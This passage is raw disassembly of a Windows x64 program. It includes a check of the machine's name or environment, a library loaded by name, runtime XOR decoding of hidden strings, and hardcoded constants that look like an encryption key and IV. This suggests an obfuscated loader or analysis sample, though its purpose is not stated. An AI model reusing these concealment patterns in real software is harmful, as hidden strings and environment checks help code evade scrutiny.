   140004076:	49 2b c8             	sub    %r8,%rcx
   140004079:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   14000407d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004081:	0f 87 20 01 00 00    	ja     0x1400041a7
   140004087:	49 8b c8             	mov    %r8,%rcx
   14000408a:	e8 91 ad 00 00       	call   0x14000ee20
   14000408f:	4c 89 6b 10          	mov    %r13,0x10(%rbx)
   140004093:	48 c7 43 18 07 00 00 	movq   $0x7,0x18(%rbx)
   14000409a:	00 
   14000409b:	66 44 89 2b          	mov    %r13w,(%rbx)
   14000409f:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
   1400040a3:	48 83 fa 07          	cmp    $0x7,%rdx
   1400040a7:	76 36                	jbe    0x1400040df
   1400040a9:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   1400040b0:	00 
   1400040b1:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   1400040b5:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400040bc:	48 8b c1             	mov    %rcx,%rax
   1400040bf:	72 19                	jb     0x1400040da
   1400040c1:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400040c5:	48 2b c1             	sub    %rcx,%rax
   1400040c8:	48 83 c2 27          	add    $0x27,%rdx
   1400040cc:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400040d0:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400040d4:	0f 87 d3 00 00 00    	ja     0x1400041ad
   1400040da:	e8 41 ad 00 00       	call   0x14000ee20
   1400040df:	66 44 89 6d 90       	mov    %r13w,-0x70(%rbp)
   1400040e4:	48 c7 45 a8 07 00 00 	movq   $0x7,-0x58(%rbp)
   1400040eb:	00 
   1400040ec:	4c 89 6d a0          	mov    %r13,-0x60(%rbp)
   1400040f0:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
   1400040f4:	48 83 fa 07          	cmp    $0x7,%rdx
   1400040f8:	76 32                	jbe    0x14000412c
   1400040fa:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004101:	00 
   140004102:	48 8b 4d b0          	mov    -0x50(%rbp),%rcx
   140004106:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000410d:	48 8b c1             	mov    %rcx,%rax
   140004110:	72 15                	jb     0x140004127
   140004112:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140004116:	48 2b c1             	sub    %rcx,%rax
   140004119:	48 83 c2 27          	add    $0x27,%rdx
   14000411d:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004121:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004125:	77 68                	ja     0x14000418f
   140004127:	e8 f4 ac 00 00       	call   0x14000ee20
   14000412c:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140004130:	49 8b cc             	mov    %r12,%rcx
   140004133:	ff 15 df be 02 00    	call   *0x2bedf(%rip)        # 0x140030018
   140004139:	85 c0                	test   %eax,%eax
   14000413b:	0f 85 d0 fc ff ff    	jne    0x140003e11
   140004141:	49 8b cc             	mov    %r12,%rcx
   140004144:	ff 15 f6 be 02 00    	call   *0x2bef6(%rip)        # 0x140030040
   14000414a:	90                   	nop
   14000414b:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
   14000414f:	48 83 fa 07          	cmp    $0x7,%rdx
   140004153:	0f 86 63 fc ff ff    	jbe    0x140003dbc
   140004159:	48 8d 14 55 02 00 00 	lea    0x2(,%rdx,2),%rdx
   140004160:	00 
   140004161:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   140004165:	48 8b c1             	mov    %rcx,%rax
   140004168:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000416f:	0f 82 42 fc ff ff    	jb     0x140003db7
   140004175:	48 83 c2 27          	add    $0x27,%rdx
   140004179:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   14000417d:	48 2b c1             	sub    %rcx,%rax
   140004180:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004184:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004188:	77 0b                	ja     0x140004195
   14000418a:	e9 28 fc ff ff       	jmp    0x140003db7
   14000418f:	e8 00 30 01 00       	call   0x140017194
   140004194:	90                   	nop
   140004195:	e8 fa 2f 01 00       	call   0x140017194
   14000419a:	90                   	nop
   14000419b:	e8 ec 6c 00 00       	call   0x14000ae8c
   1400041a0:	90                   	nop
   1400041a1:	e8 ee 2f 01 00       	call   0x140017194
   1400041a6:	cc                   	int3
   1400041a7:	e8 e8 2f 01 00       	call   0x140017194
   1400041ac:	90                   	nop
   1400041ad:	e8 e2 2f 01 00       	call   0x140017194
   1400041b2:	cc                   	int3
   1400041b3:	cc                   	int3
   1400041b4:	cc                   	int3
   1400041b5:	cc                   	int3
   1400041b6:	cc                   	int3
   1400041b7:	cc                   	int3
   1400041b8:	cc                   	int3
   1400041b9:	cc                   	int3
   1400041ba:	cc                   	int3
   1400041bb:	cc                   	int3
   1400041bc:	cc                   	int3
   1400041bd:	cc                   	int3
   1400041be:	cc                   	int3
   1400041bf:	cc                   	int3
   1400041c0:	40 53                	rex push %rbx
   1400041c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400041c6:	48 8b d9             	mov    %rcx,%rbx
   1400041c9:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   1400041cd:	48 85 c9             	test   %rcx,%rcx
   1400041d0:	74 14                	je     0x1400041e6
   1400041d2:	48 8b 01             	mov    (%rcx),%rax
   1400041d5:	48 3b cb             	cmp    %rbx,%rcx
   1400041d8:	0f 95 c2             	setne  %dl
   1400041db:	ff 50 20             	call   *0x20(%rax)
   1400041de:	48 c7 43 38 00 00 00 	movq   $0x0,0x38(%rbx)
   1400041e5:	00 
   1400041e6:	48 83 c4 20          	add    $0x20,%rsp
   1400041ea:	5b                   	pop    %rbx
   1400041eb:	c3                   	ret
   1400041ec:	cc                   	int3
   1400041ed:	cc                   	int3
   1400041ee:	cc                   	int3
   1400041ef:	cc                   	int3
   1400041f0:	48 8b c4             	mov    %rsp,%rax
   1400041f3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400041f7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400041fb:	55                   	push   %rbp
   1400041fc:	57                   	push   %rdi
   1400041fd:	41 54                	push   %r12
   1400041ff:	41 56                	push   %r14
   140004201:	41 57                	push   %r15
   140004203:	48 8d a8 98 fc ff ff 	lea    -0x368(%rax),%rbp
   14000420a:	48 81 ec 40 04 00 00 	sub    $0x440,%rsp
   140004211:	0f 29 70 c8          	movaps %xmm6,-0x38(%rax)
   140004215:	0f 29 78 b8          	movaps %xmm7,-0x48(%rax)
   140004219:	44 0f 29 40 a8       	movaps %xmm8,-0x58(%rax)
   14000421e:	44 0f 29 48 98       	movaps %xmm9,-0x68(%rax)
   140004223:	48 8b 05 16 ee 03 00 	mov    0x3ee16(%rip),%rax        # 0x140043040
   14000422a:	48 33 c4             	xor    %rsp,%rax
   14000422d:	48 89 85 f0 02 00 00 	mov    %rax,0x2f0(%rbp)
   140004234:	4c 8b fa             	mov    %rdx,%r15
   140004237:	44 8b f1             	mov    %ecx,%r14d
   14000423a:	45 33 e4             	xor    %r12d,%r12d
   14000423d:	41 8b dc             	mov    %r12d,%ebx
   140004240:	89 9d 60 01 00 00    	mov    %ebx,0x160(%rbp)
   140004246:	c7 85 60 01 00 00 10 	movl   $0x10,0x160(%rbp)
   14000424d:	00 00 00 
   140004250:	48 8d 95 60 01 00 00 	lea    0x160(%rbp),%rdx
   140004257:	48 8d 8d d0 02 00 00 	lea    0x2d0(%rbp),%rcx
   14000425e:	ff 15 24 be 02 00    	call   *0x2be24(%rip)        # 0x140030088
   140004264:	85 c0                	test   %eax,%eax
   140004266:	0f 84 a4 0c 00 00    	je     0x140004f10
   14000426c:	48 8d 15 0d 75 03 00 	lea    0x3750d(%rip),%rdx        # 0x14003b780
   140004273:	48 8d 0d 66 05 04 00 	lea    0x40566(%rip),%rcx        # 0x1400447e0
   14000427a:	e8 91 38 00 00       	call   0x140007b10
   14000427f:	48 8b c8             	mov    %rax,%rcx
   140004282:	48 8d 95 d0 02 00 00 	lea    0x2d0(%rbp),%rdx
   140004289:	e8 82 38 00 00       	call   0x140007b10
   14000428e:	48 8b c8             	mov    %rax,%rcx
   140004291:	e8 3a 3b 00 00       	call   0x140007dd0
   140004296:	0f 57 c0             	xorps  %xmm0,%xmm0
   140004299:	0f 11 45 e0          	movups %xmm0,-0x20(%rbp)
   14000429d:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400042a0:	f3 0f 7f 4d f0       	movdqu %xmm1,-0x10(%rbp)
   1400042a5:	48 8d 85 d0 02 00 00 	lea    0x2d0(%rbp),%rax
   1400042ac:	48 c7 c7 ff ff ff ff 	mov    $0xffffffffffffffff,%rdi
   1400042b3:	4c 8b c7             	mov    %rdi,%r8
   1400042b6:	49 ff c0             	inc    %r8
   1400042b9:	66 42 39 1c 40       	cmp    %bx,(%rax,%r8,2)
   1400042be:	75 f6                	jne    0x1400042b6
   1400042c0:	48 8d 95 d0 02 00 00 	lea    0x2d0(%rbp),%rdx
   1400042c7:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400042cb:	e8 50 48 00 00       	call   0x140008b20
   1400042d0:	4c 8d 45 e0          	lea    -0x20(%rbp),%r8
   1400042d4:	4c 8b 4d e0          	mov    -0x20(%rbp),%r9
   1400042d8:	4c 8b 55 f8          	mov    -0x8(%rbp),%r10
   1400042dc:	49 83 fa 07          	cmp    $0x7,%r10
   1400042e0:	4d 0f 47 c1          	cmova  %r9,%r8
   1400042e4:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
   1400042e8:	48 83 fa 0c          	cmp    $0xc,%rdx
   1400042ec:	75 2b                	jne    0x140004319
   1400042ee:	48 8d 0d eb 73 03 00 	lea    0x373eb(%rip),%rcx        # 0x14003b6e0
   1400042f5:	48 85 d2             	test   %rdx,%rdx
   1400042f8:	74 1a                	je     0x140004314
   1400042fa:	4c 2b c1             	sub    %rcx,%r8
   1400042fd:	0f 1f 00             	nopl   (%rax)
   140004300:	42 0f b7 04 01       	movzwl (%rcx,%r8,1),%eax
   140004305:	66 3b 01             	cmp    (%rcx),%ax
   140004308:	75 0f                	jne    0x140004319
   14000430a:	48 83 c1 02          	add    $0x2,%rcx
   14000430e:	48 83 ea 01          	sub    $0x1,%rdx
   140004312:	75 ec                	jne    0x140004300
   140004314:	40 32 f6             	xor    %sil,%sil
   140004317:	eb 03                	jmp    0x14000431c
   140004319:	40 b6 01             	mov    $0x1,%sil
   14000431c:	49 83 fa 07          	cmp    $0x7,%r10
   140004320:	76 35                	jbe    0x140004357
   140004322:	4a 8d 14 55 02 00 00 	lea    0x2(,%r10,2),%rdx
   140004329:	00 
   14000432a:	49 8b c1             	mov    %r9,%rax
   14000432d:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004334:	72 19                	jb     0x14000434f
   140004336:	48 83 c2 27          	add    $0x27,%rdx
   14000433a:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   14000433e:	49 2b c1             	sub    %r9,%rax
   140004341:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004345:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004349:	0f 87 9c 0c 00 00    	ja     0x140004feb
   14000434f:	49 8b c9             	mov    %r9,%rcx
   140004352:	e8 c9 aa 00 00       	call   0x14000ee20
   140004357:	40 84 f6             	test   %sil,%sil
   14000435a:	74 1d                	je     0x140004379
   14000435c:	48 8d 15 3d 74 03 00 	lea    0x3743d(%rip),%rdx        # 0x14003b7a0
   140004363:	48 8d 0d 76 04 04 00 	lea    0x40476(%rip),%rcx        # 0x1400447e0
   14000436a:	e8 a1 37 00 00       	call   0x140007b10
   14000436f:	b8 01 00 00 00       	mov    $0x1,%eax
   140004374:	e9 33 0c 00 00       	jmp    0x140004fac
   140004379:	be 01 00 00 00       	mov    $0x1,%esi
   14000437e:	41 83 fe 02          	cmp    $0x2,%r14d
   140004382:	75 77                	jne    0x1400043fb
   140004384:	49 8b 57 08          	mov    0x8(%r15),%rdx
   140004388:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000438b:	0f 11 45 c0          	movups %xmm0,-0x40(%rbp)
   14000438f:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004392:	f3 0f 7f 4d d0       	movdqu %xmm1,-0x30(%rbp)
   140004397:	4c 8b c7             	mov    %rdi,%r8
   14000439a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400043a0:	49 ff c0             	inc    %r8
   1400043a3:	66 42 39 1c 42       	cmp    %bx,(%rdx,%r8,2)
   1400043a8:	75 f6                	jne    0x1400043a0
   1400043aa:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400043ae:	e8 6d 47 00 00       	call   0x140008b20
   1400043b3:	8b de                	mov    %esi,%ebx
   1400043b5:	4c 8d 45 c0          	lea    -0x40(%rbp),%r8
   1400043b9:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   1400043bd:	4c 8b 55 d8          	mov    -0x28(%rbp),%r10
   1400043c1:	49 83 fa 07          	cmp    $0x7,%r10
   1400043c5:	4d 0f 47 c1          	cmova  %r9,%r8
   1400043c9:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
   1400043cd:	48 83 fa 09          	cmp    $0x9,%rdx
   1400043d1:	75 30                	jne    0x140004403
   1400043d3:	48 8d 0d 6e 74 03 00 	lea    0x3746e(%rip),%rcx        # 0x14003b848
   1400043da:	48 85 d2             	test   %rdx,%rdx
   1400043dd:	74 16                	je     0x1400043f5
   1400043df:	4c 2b c1             	sub    %rcx,%r8
   1400043e2:	41 0f b7 04 08       	movzwl (%r8,%rcx,1),%eax
   1400043e7:	66 3b 01             	cmp    (%rcx),%ax
   1400043ea:	75 17                	jne    0x140004403
   1400043ec:	48 83 c1 02          	add    $0x2,%rcx
   1400043f0:	48 2b d3             	sub    %rbx,%rdx
   1400043f3:	75 ed                	jne    0x1400043e2
   1400043f5:	44 0f b6 f3          	movzbl %bl,%r14d
   1400043f9:	eb 0b                	jmp    0x140004406
   1400043fb:	4c 8b 55 d8          	mov    -0x28(%rbp),%r10
   1400043ff:	4c 8b 4d c0          	mov    -0x40(%rbp),%r9
   140004403:	45 32 f6             	xor    %r14b,%r14b
   140004406:	40 84 de             	test   %bl,%sil
   140004409:	74 3b                	je     0x140004446
   14000440b:	49 83 fa 07          	cmp    $0x7,%r10
   14000440f:	76 35                	jbe    0x140004446
   140004411:	4a 8d 14 55 02 00 00 	lea    0x2(,%r10,2),%rdx
   140004418:	00 
   140004419:	49 8b c1             	mov    %r9,%rax
   14000441c:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140004423:	72 19                	jb     0x14000443e
   140004425:	48 83 c2 27          	add    $0x27,%rdx
   140004429:	4d 8b 49 f8          	mov    -0x8(%r9),%r9
   14000442d:	49 2b c1             	sub    %r9,%rax
   140004430:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140004434:	48 83 f8 1f          	cmp    $0x1f,%rax
   140004438:	0f 87 ad 0b 00 00    	ja     0x140004feb
   14000443e:	49 8b c9             	mov    %r9,%rcx
   140004441:	e8 da a9 00 00       	call   0x14000ee20
   140004446:	48 8d 0d 13 74 03 00 	lea    0x37413(%rip),%rcx        # 0x14003b860
   14000444d:	ff 15 1d bc 02 00    	call   *0x2bc1d(%rip)        # 0x140030070
   140004453:	48 89 05 ce 1c 04 00 	mov    %rax,0x41cce(%rip)        # 0x140046128
   14000445a:	48 85 c0             	test   %rax,%rax
   14000445d:	75 13                	jne    0x140004472
   14000445f:	48 8d 15 1a 74 03 00 	lea    0x3741a(%rip),%rdx        # 0x14003b880
   140004466:	48 8d 0d c3 05 04 00 	lea    0x405c3(%rip),%rcx        # 0x140044a30
   14000446d:	e8 9e 36 00 00       	call   0x140007b10
   140004472:	c7 85 40 01 00 00 60 	movl   $0x10eb3d60,0x140(%rbp)
   140004479:	3d eb 10 
   14000447c:	c7 85 44 01 00 00 15 	movl   $0xbe71ca15,0x144(%rbp)
   140004483:	ca 71 be 
   140004486:	c7 85 48 01 00 00 2b 	movl   $0xf0ae732b,0x148(%rbp)
   14000448d:	73 ae f0 
   140004490:	c7 85 4c 01 00 00 85 	movl   $0x81777d85,0x14c(%rbp)
   140004497:	7d 77 81 
   14000449a:	c7 85 50 01 00 00 1f 	movl   $0x72c351f,0x150(%rbp)
   1400044a1:	35 2c 07 
   1400044a4:	c7 85 54 01 00 00 3b 	movl   $0xd708613b,0x154(%rbp)
   1400044ab:	61 08 d7 
   1400044ae:	c7 85 58 01 00 00 2d 	movl   $0xa310982d,0x158(%rbp)
   1400044b5:	98 10 a3 
   1400044b8:	c7 85 5c 01 00 00 09 	movl   $0xf4df1409,0x15c(%rbp)
   1400044bf:	14 df f4 
   1400044c2:	c7 85 30 01 00 00 60 	movl   $0x10eb3d60,0x130(%rbp)
   1400044c9:	3d eb 10 
   1400044cc:	c7 85 34 01 00 00 15 	movl   $0xbe71ca15,0x134(%rbp)
   1400044d3:	ca 71 be 
   1400044d6:	c7 85 38 01 00 00 2b 	movl   $0xf0ae732b,0x138(%rbp)
   1400044dd:	73 ae f0 
   1400044e0:	c7 85 3c 01 00 00 85 	movl   $0x81777d85,0x13c(%rbp)
   1400044e7:	7d 77 81 
   1400044ea:	0f 10 05 87 82 03 00 	movups 0x38287(%rip),%xmm0        # 0x14003c778
   1400044f1:	0f 29 44 24 40       	movaps %xmm0,0x40(%rsp)
   1400044f6:	0f 10 0d 8b 82 03 00 	movups 0x3828b(%rip),%xmm1        # 0x14003c788
   1400044fd:	0f 29 4c 24 50       	movaps %xmm1,0x50(%rsp)
   140004502:	f2 0f 10 05 8e 82 03 	movsd  0x3828e(%rip),%xmm0        # 0x14003c798
   140004509:	00 
   14000450a:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   140004510:	8b 05 8a 82 03 00    	mov    0x3828a(%rip),%eax        # 0x14003c7a0
   140004516:	89 44 24 68          	mov    %eax,0x68(%rsp)
   14000451a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000451d:	33 c0                	xor    %eax,%eax
   14000451f:	0f 11 85 70 01 00 00 	movups %xmm0,0x170(%rbp)
   140004526:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   14000452d:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   140004534:	89 85 98 01 00 00    	mov    %eax,0x198(%rbp)
   14000453a:	49 8b cc             	mov    %r12,%rcx
   14000453d:	66 44 0f 6f 0d 7a 83 	movdqa 0x3837a(%rip),%xmm9        # 0x14003c8c0
   140004544:	03 00 
   140004546:	f3 0f 6f 44 4c 40    	movdqu 0x40(%rsp,%rcx,2),%xmm0
   14000454c:	41 0f 57 c1          	xorps  %xmm9,%xmm0
   140004550:	f3 0f 7f 84 4d 70 01 	movdqu %xmm0,0x170(%rbp,%rcx,2)
   140004557:	00 00 
   140004559:	48 83 c1 08          	add    $0x8,%rcx
   14000455d:	48 83 f9 10          	cmp    $0x10,%rcx
   140004561:	72 e3                	jb     0x140004546
   140004563:	48 83 f9 15          	cmp    $0x15,%rcx
   140004567:	73 22                	jae    0x14000458b
   140004569:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140004570:	b8 d2 00 00 00       	mov    $0xd2,%eax
   140004575:	66 33 44 4c 40       	xor    0x40(%rsp,%rcx,2),%ax
   14000457a:	66 89 84 4d 70 01 00 	mov    %ax,0x170(%rbp,%rcx,2)
   140004581:	00 
   140004582:	48 ff c1             	inc    %rcx
   140004585:	48 83 f9 15          	cmp    $0x15,%rcx
   140004589:	72 e5                	jb     0x140004570
   14000458b:	66 44 89 a5 9a 01 00 	mov    %r12w,0x19a(%rbp)
   140004592:	00 
   140004593:	0f 10 85 70 01 00 00 	movups 0x170(%rbp),%xmm0
   14000459a:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000459f:	0f 10 8d 80 01 00 00 	movups 0x180(%rbp),%xmm1
   1400045a6:	0f 11 4c 24 50       	movups %xmm1,0x50(%rsp)
   1400045ab:	f2 0f 10 85 90 01 00 	movsd  0x190(%rbp),%xmm0
   1400045b2:	00 
   1400045b3:	f2 0f 11 44 24 60    	movsd  %xmm0,0x60(%rsp)
   1400045b9:	8b 85 98 01 00 00    	mov    0x198(%rbp),%eax
   1400045bf:	89 44 24 68          	mov    %eax,0x68(%rsp)
   1400045c3:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045c6:	0f 11 85 20 02 00 00 	movups %xmm0,0x220(%rbp)
   1400045cd:	0f 57 c9             	xorps  %xmm1,%xmm1
   1400045d0:	f3 0f 7f 8d 30 02 00 	movdqu %xmm1,0x230(%rbp)
   1400045d7:	00 
   1400045d8:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   1400045dd:	4c 8b c7             	mov    %rdi,%r8
   1400045e0:	49 ff c0             	inc    %r8
   1400045e3:	66 46 39 24 40       	cmp    %r12w,(%rax,%r8,2)
   1400045e8:	75 f6                	jne    0x1400045e0
   1400045ea:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   1400045ef:	48 8d 8d 20 02 00 00 	lea    0x220(%rbp),%rcx
   1400045f6:	e8 25 45 00 00       	call   0x140008b20
   1400045fb:	90                   	nop
   1400045fc:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400045ff:	0f 11 85 00 02 00 00 	movups %xmm0,0x200(%rbp)
   140004606:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004609:	f3 0f 7f 8d 10 02 00 	movdqu %xmm1,0x210(%rbp)
   140004610:	00 
   140004611:	41 b8 d0 07 00 00    	mov    $0x7d0,%r8d
   140004617:	48 8d 15 b2 72 03 00 	lea    0x372b2(%rip),%rdx        # 0x14003b8d0
   14000461e:	48 8d 8d 00 02 00 00 	lea    0x200(%rbp),%rcx
   140004625:	e8 26 46 00 00       	call   0x140008c50
   14000462a:	90                   	nop
   14000462b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000462e:	0f 11 85 e0 01 00 00 	movups %xmm0,0x1e0(%rbp)
   140004635:	0f 57 c9             	xorps  %xmm1,%xmm1
   140004638:	f3 0f 7f 8d f0 01 00 	movdqu %xmm1,0x1f0(%rbp)
   14000463f:	00 
   140004640:	41 b8 65 05 00 00    	mov    $0x565,%r8d
   140004646:	48 8d 15 63 7a 03 00 	lea    0x37a63(%rip),%rdx        # 0x14003c0b0
   14000464d:	48 8d 8d e0 01 00 00 	lea    0x1e0(%rbp),%rcx
   140004654:	e8 f7 45 00 00       	call   0x140008c50
   140004659:	90                   	nop
   14000465a:	45 33 c0             	xor    %r8d,%r8d
   14000465d:	48 8d 8d 00 02 00 00 	lea    0x200(%rbp),%rcx
   140004664:	e8 e7 2f 00 00       	call   0x140007650
   140004669:	45 33 c0             	xor    %r8d,%r8d
   14000466c:	48 8d 8d e0 01 00 00 	lea    0x1e0(%rbp),%rcx
   140004673:	e8 d8 2f 00 00       	call   0x140007650
   140004678:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000467b:	0f 11 85 a0 01 00 00 	movups %xmm0,0x1a0(%rbp)
   140004682:	0f 11 85 b0 01 00 00 	movups %xmm0,0x1b0(%rbp)
   140004689:	0f 11 85 c0 01 00 00 	movups %xmm0,0x1c0(%rbp)
   140004690:	0f 11 85 d0 01 00 00 	movups %xmm0,0x1d0(%rbp)
   140004697:	44 0f 28 85 30 01 00 	movaps 0x130(%rbp),%xmm8
   14000469e:	00 
   14000469f:	0f 10 b5 40 01 00 00 	movups 0x140(%rbp),%xmm6
   1400046a6:	0f 10 bd 50 01 00 00 	movups 0x150(%rbp),%xmm7
   1400046ad:	48 8d 0d ec 6f 03 00 	lea    0x36fec(%rip),%rcx        # 0x14003b6a0
   1400046b4:	ff 15 a6 b9 02 00    	call   *0x2b9a6(%rip)        # 0x140030060
   1400046ba:	0f 29 b5 70 01 00 00 	movaps %xmm6,0x170(%rbp)
   1400046c1:	0f 29 bd 80 01 00 00 	movaps %xmm7,0x180(%rbp)
   1400046c8:	4c 8d 85 70 01 00 00 	lea    0x170(%rbp),%r8
   1400046cf:	48 8b d0             	mov    %rax,%rdx
   1400046d2:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   1400046d9:	e8 d2 e0 ff ff       	call   0x1400027b0
   1400046de:	48 8d 05 73 81 03 00 	lea    0x38173(%rip),%rax        # 0x14003c858
   1400046e5:	48 89 85 a0 01 00 00 	mov    %rax,0x1a0(%rbp)
   1400046ec:	66 44 0f 7e c0       	movd   %xmm8,%eax
   1400046f1:	88 85 d0 01 00 00    	mov    %al,0x1d0(%rbp)
   1400046f7:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   1400046fc:	66 0f 73 d8 01       	psrldq $0x1,%xmm0
   140004701:	66 0f 7e c0          	movd   %xmm0,%eax
   140004705:	88 85 d1 01 00 00    	mov    %al,0x1d1(%rbp)
   14000470b:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004710:	66 0f 73 d8 02       	psrldq $0x2,%xmm0
   140004715:	66 0f 7e c0          	movd   %xmm0,%eax
   140004719:	88 85 d2 01 00 00    	mov    %al,0x1d2(%rbp)
   14000471f:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004724:	66 0f 73 d8 03       	psrldq $0x3,%xmm0
   140004729:	66 0f 7e c0          	movd   %xmm0,%eax
   14000472d:	88 85 d3 01 00 00    	mov    %al,0x1d3(%rbp)
   140004733:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004738:	66 0f 73 d8 04       	psrldq $0x4,%xmm0
   14000473d:	66 0f 7e c0          	movd   %xmm0,%eax
   140004741:	88 85 d4 01 00 00    	mov    %al,0x1d4(%rbp)
   140004747:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   14000474c:	66 0f 73 d8 05       	psrldq $0x5,%xmm0
   140004751:	66 0f 7e c0          	movd   %xmm0,%eax
   140004755:	88 85 d5 01 00 00    	mov    %al,0x1d5(%rbp)
   14000475b:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004760:	66 0f 73 d8 06       	psrldq $0x6,%xmm0
   140004765:	66 0f 7e c0          	movd   %xmm0,%eax
   140004769:	88 85 d6 01 00 00    	mov    %al,0x1d6(%rbp)
   14000476f:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004774:	66 0f 73 d8 07       	psrldq $0x7,%xmm0
   140004779:	66 0f 7e c0          	movd   %xmm0,%eax
   14000477d:	88 85 d7 01 00 00    	mov    %al,0x1d7(%rbp)
   140004783:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004788:	66 0f 73 d8 08       	psrldq $0x8,%xmm0
   14000478d:	66 0f 7e c0          	movd   %xmm0,%eax
   140004791:	88 85 d8 01 00 00    	mov    %al,0x1d8(%rbp)
   140004797:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   14000479c:	66 0f 73 d8 09       	psrldq $0x9,%xmm0
   1400047a1:	66 0f 7e c0          	movd   %xmm0,%eax
   1400047a5:	88 85 d9 01 00 00    	mov    %al,0x1d9(%rbp)
   1400047ab:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   1400047b0:	66 0f 73 d8 0a       	psrldq $0xa,%xmm0
   1400047b5:	66 0f 7e c0          	movd   %xmm0,%eax
   1400047b9:	88 85 da 01 00 00    	mov    %al,0x1da(%rbp)
   1400047bf:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   1400047c4:	66 0f 73 d8 0b       	psrldq $0xb,%xmm0
   1400047c9:	66 0f 7e c0          	movd   %xmm0,%eax
   1400047cd:	88 85 db 01 00 00    	mov    %al,0x1db(%rbp)
   1400047d3:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   1400047d8:	66 0f 73 d8 0c       	psrldq $0xc,%xmm0
   1400047dd:	66 0f 7e c0          	movd   %xmm0,%eax
   1400047e1:	88 85 dc 01 00 00    	mov    %al,0x1dc(%rbp)
   1400047e7:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   1400047ec:	66 0f 73 d8 0d       	psrldq $0xd,%xmm0
   1400047f1:	66 0f 7e c0          	movd   %xmm0,%eax
   1400047f5:	88 85 dd 01 00 00    	mov    %al,0x1dd(%rbp)
   1400047fb:	66 41 0f 6f c0       	movdqa %xmm8,%xmm0
   140004800:	66 0f 73 d8 0e       	psrldq $0xe,%xmm0
   140004805:	66 0f 7e c0          	movd   %xmm0,%eax
   140004809:	88 85 de 01 00 00    	mov    %al,0x1de(%rbp)
   14000480f:	66 41 0f 73 d8 0f    	psrldq $0xf,%xmm8
   140004815:	66 44 0f 7e c0       	movd   %xmm8,%eax
   14000481a:	88 85 df 01 00 00    	mov    %al,0x1df(%rbp)
   140004820:	48 8d 0d 19 fe 03 00 	lea    0x3fe19(%rip),%rcx        # 0x140044640
   140004827:	45 84 f6             	test   %r14b,%r14b
   14000482a:	75 45                	jne    0x140004871
   14000482c:	48 8d 15 e5 7d 03 00 	lea    0x37de5(%rip),%rdx        # 0x14003c618
   140004833:	e8 08 3a 00 00       	call   0x140008240
   140004838:	48 8d 85 40 01 00 00 	lea    0x140(%rbp),%rax
   14000483f:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004844:	48 8d 85 30 01 00 00 	lea    0x130(%rbp),%rax
   14000484b:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140004850:	48 8d 85 00 02 00 00 	lea    0x200(%rbp),%rax
